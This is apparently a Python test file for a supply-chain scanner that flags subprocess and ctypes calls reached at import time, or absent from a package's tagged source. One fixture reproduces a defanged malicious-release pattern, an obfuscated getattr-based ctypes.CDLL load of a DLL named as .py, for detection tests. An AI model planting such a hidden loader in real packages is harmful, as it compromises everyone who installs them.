    # ply/lex.py; test/ holds a package, so it is not "outside" either.
    util = "import subprocess\n\ndef go():\n    subprocess.run(['x'])\n"
    base = {
        "demo/__init__.py": "",
        "demo/util.py": util,
        "test/pkg/__init__.py": "",
        "test/calc.py": "from demo.util import go\n",
    }
    cand = {**base, "test/calc.py": "from demo.util import go\ngo()\n"}
    result = run_checks(
        CHANGE,
        release("1.0", sdist_files=base, sdist_only=True),
        release("1.1", sdist_files=cand, sdist_only=True),
    )
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.INFO
    assert "test module(s)" in f.title
    # demo/test/ is installed with the package (django.test), so it is package code.
    inside = {
        "demo/__init__.py": "",
        "demo/util.py": util,
        "demo/test/__init__.py": "",
        "demo/test/calc.py": "from demo.util import go\ngo()\n",
    }
    result = run_checks(CHANGE, release("1.0", base), release("1.1", inside))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.WARN


def test_call_a_package_module_and_a_test_file_both_reach_is_one_warn() -> None:
    # The test module's name sorts first, so its chain is followed first; the
    # package module's chain must still be seen, and the call reported once.
    util = "import subprocess\n\ndef go():\n    subprocess.run(['x'])\n"
    base = {
        "demo/__init__.py": "",
        "demo/conftest.py": "from demo.util import go\n",
        "demo/util.py": util,
        "demo/zeta.py": "from demo.util import go\n",
    }
    cand = {
        **base,
        "demo/conftest.py": "from demo.util import go\ngo()\n",
        "demo/zeta.py": "from demo.util import go\ngo()\n",
    }
    result = run_checks(CHANGE, release("1.0", base), release("1.1", cand))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.WARN
    assert [e.summary for e in f.evidence if e.kind == "file"] == [
        "demo/util.py:4 calls subprocess.run (in go(), reached at import from demo/zeta.py)"
    ]


def test_function_in_another_module_that_nothing_calls_at_import_is_quiet() -> None:
    files = {
        "memos/__init__.py": "from memos import log\n",
        "memos/log.py": "import subprocess\n\ndef rotate():\n    subprocess.run(['logrotate'])\n",
    }
    assert "GRN-C003" not in rules(release("1.0", {"memos/__init__.py": ""}), release("1.1", files))


def test_getattr_on_the_module_object_fires() -> None:
    # The num2words 0.5.15 shape, with the DLL named .py left out.
    payload = (
        "import os, sys, ctypes\n"
        "try:\n    ct = getattr(sys.modules[__name__], 'ctypes')\n"
        "    getattr(ct, 'CDLL')(os.path.join('x', '_build.py'))\nexcept Exception:\n    pass\n"
    )
    base = release("1.0", {"demo/__init__.py": INIT})
    [f] = [
        f
        for f in run_checks(
            CHANGE, base, release("1.1", {"demo/__init__.py": INIT + payload})
        ).findings
    ]
    assert f.rule_id == "GRN-C003" and "ctypes.CDLL" in f.evidence[0].summary


# GRN-C007
DL_PAYLOAD = "import subprocess\n\ndef run(cmd):\n    return subprocess.Popen(cmd)\n"


def with_source_match(facts, *unmatched, matched: int = 1, unchecked=()):
    art = facts.artifacts[0]
    match = SourceMatch(
        repo="o/r",
        tag=f"v{facts.version}",
        commit="c" * 40,
        prefix="src/",
        matched=matched,
        unmatched=tuple(unmatched),
        unchecked=tuple(unchecked),
    )
    return replace(facts, artifacts=(replace(art, source_match=match),))


def test_code_not_in_source_fires_on_a_sensitive_call_the_source_lacks() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = with_source_match(
        release("1.1", {"demo/__init__.py": INIT, "demo/dl.py": DL_PAYLOAD}),
        UnsourcedFile("demo/dl.py", True, (CallSite("subprocess.Popen", 4, "run"),)),
    )
    result = run_checks(CHANGE, base, cand)
    finding = next(f for f in result.findings if f.rule_id == "GRN-C007")
    assert finding.severity == Severity.WARN
    assert "not in github.com/o/r at tag v1.1" in finding.title
    assert finding.evidence[0].kind == "tag"
    assert finding.evidence[1].path == "demo/dl.py" and finding.evidence[1].line == 4
    assert "subprocess.Popen (in run())" in finding.evidence[1].summary
    assert finding.evidence[1].url == "https://github.com/o/r/blob/" + "c" * 40 + "/src/demo/dl.py"


def test_code_not_in_source_names_the_renamed_source_it_compared_with() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = with_source_match(
        release("1.1", {"demo/__init__.py": INIT, "demox/dl.py": DL_PAYLOAD}),
        UnsourcedFile(
            "demox/dl.py", True, (CallSite("subprocess.Popen", 4, "run"),), at="lib/demo/dl.py"
        ),
    )
    finding = next(f for f in run_checks(CHANGE, base, cand).findings if f.rule_id == "GRN-C007")
    assert "the source differs from lib/demo/dl.py at v1.1" in finding.evidence[1].summary
    assert finding.evidence[1].url == "https://github.com/o/r/blob/" + "c" * 40 + "/lib/demo/dl.py"


def test_code_not_in_source_quiet_for_generated_files_without_sensitive_calls() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = with_source_match(
        release("1.1", {"demo/__init__.py": INIT, "demo/_version.py": "v = 1\n"}),
        UnsourcedFile("demo/_version.py", False, ()),
    )
    assert "GRN-C007" not in rules(base, cand)


def test_code_not_in_source_quiet_when_trusted_version_carried_the_same_call() -> None:
    unsourced = UnsourcedFile("demo/dl.py", False, (CallSite("subprocess.Popen", 4, "run"),))
    base = with_source_match(release("1.0", {"demo/dl.py": DL_PAYLOAD}), unsourced)
    cand = with_source_match(release("1.1", {"demo/dl.py": DL_PAYLOAD}), unsourced)
    assert "GRN-C007" not in rules(base, cand)
    gained = UnsourcedFile("demo/dl.py", False, (*unsourced.calls, CallSite("os.system", 9)))
    assert "GRN-C007" in rules(base, with_source_match(release("1.1", {}), gained))


def test_code_not_in_source_quiet_without_a_comparison() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    assert "GRN-C007" not in rules(base, release("1.1", {"demo/dl.py": DL_PAYLOAD}))
